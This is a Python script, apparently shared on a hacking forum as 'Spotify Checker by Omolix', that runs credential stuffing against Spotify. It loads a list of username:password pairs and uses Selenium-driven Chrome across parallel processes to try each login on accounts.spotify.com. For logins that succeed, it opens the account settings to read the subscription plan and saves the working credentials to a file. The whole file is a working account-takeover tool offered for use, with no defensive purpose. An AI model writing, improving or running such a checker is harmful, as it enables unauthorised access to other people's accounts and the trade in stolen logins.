from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from time import sleep
import os
from colorama import init
from colorama import Fore, Back, Style
import ctypes
import datetime
from multiprocessing import Pool

'''Цвета'''
init()

'''Текст в начало'''
text = Fore.YELLOW+'''
				 ██████╗██████╗  █████╗ ████████╗██╗███████╗██╗   ██╗
				██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██║██╔════╝╚██╗ ██╔╝
				╚█████╗ ██████╔╝██║  ██║   ██║   ██║█████╗   ╚████╔╝ 
				 ╚═══██╗██╔═══╝ ██║  ██║   ██║   ██║██╔══╝    ╚██╔╝  
				██████╔╝██║     ╚█████╔╝   ██║   ██║██║        ██║   
				╚═════╝ ╚═╝      ╚════╝    ╚═╝   ╚═╝╚═╝        ╚═╝   
				 █████╗ ██╗  ██╗███████╗ █████╗ ██╗  ██╗███████╗██████╗ 
				██╔══██╗██║  ██║██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
				██║  ╚═╝███████║█████╗  ██║  ╚═╝█████═╝ █████╗  ██████╔╝
				██║  ██╗██╔══██║██╔══╝  ██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗
				╚█████╔╝██║  ██║███████╗╚█████╔╝██║ ╚██╗███████╗██║  ██║
				 ╚════╝ ╚═╝  ╚═╝╚══════╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
				BY OMOLIX
'''+Style.RESET_ALL

'''Перед запуском осн. функции'''
def main_start():
	ctypes.windll.kernel32.SetConsoleTitleW("Spotify Checker by Omolix v1.1 | lolz.guru/members/2196378/")
	os.system('cls')

	if not os.path.exists('chromedriver.exe'):
		print('You dont have chromedriver.exe! Download - bit.ly/35PexKM')
		input()
		exit()

'''Переменные'''
temp = []
nvar = 'results'

'''Создание папки и файлов'''
def main_variables():
	if not os.path.exists(nvar):
		os.mkdir(nvar)
	valid = open(nvar+'\\valid.txt','w').close()

'''Основная функция'''
def checkvalid(line):
	try:
		global pathto
		username = line.split(':')[0]
		password = line.split(':')[1]
		valid = open(nvar+'\\valid.txt','a')
		driver = webdriver.Chrome(executable_path=os.path.abspath(os.curdir)+'\\chromedriver.exe')
		driver.get(url='https://accounts.spotify.com/ru/login/')
		driver.find_element_by_id("login-username").send_keys(username)
		driver.find_element_by_id("login-password").send_keys(password)
		driver.find_element_by_id("login-button").click()
		sleep(0.8)
		elements = driver.find_elements(By.XPATH, '//*[@id="root"]/div/div[2]/div/div/div[1]/span/p')
		if elements == []:
			elements = ['nothing']
		for el in elements:
			if el != 'nothing':
				print(Back.RED+f'[INVALID] / {username}:{password}'+Style.RESET_ALL+Fore.BLACK)
			else:
				sleep(0.5)
				driver.find_element_by_id("account-settings-link").click()
				sleep(0.5)
				elements = driver.find_elements(By.XPATH, '//*[@id="your-plan"]/section/div/div[1]/div[1]/span')
				for element in elements:
					plan = element.text
				print(Back.GREEN+f'[VALID] / {username}:{password} | {plan}'+Style.RESET_ALL+Fore.BLACK)
				valid.write(f'{username}:{password} | {plan}\n')
		valid.close()
	except Exception as ex:
		print(ex)
		pass

'''Присваивание переменным значений'''
def input_info():
	op = input(text+Fore.YELLOW+'Path to file: '+Style.BRIGHT)
	if not os.path.exists(op):
		print(Fore.YELLOW+'Error! Wrong path.'+Style.RESET_ALL+Fore.BLACK)
		exit()
	count = len(open(op,encoding='utf-8').readlines())
	print(Fore.YELLOW+f'Uploaded {count} lines.\nStarting..'+Style.RESET_ALL+Fore.BLACK)
	for line in open(op,encoding='utf-8').readlines():
		line = line.rstrip()
		temp.append(line)

if __name__ == '__main__':
	main_start()
	main_variables()
	input_info()
	threading = int(input(Style.RESET_ALL+Fore.YELLOW+'Threading: '+Style.BRIGHT))
	print(Style.RESET_ALL+Fore.BLACK)
	with Pool(threading) as p:
		p.map(checkvalid, temp)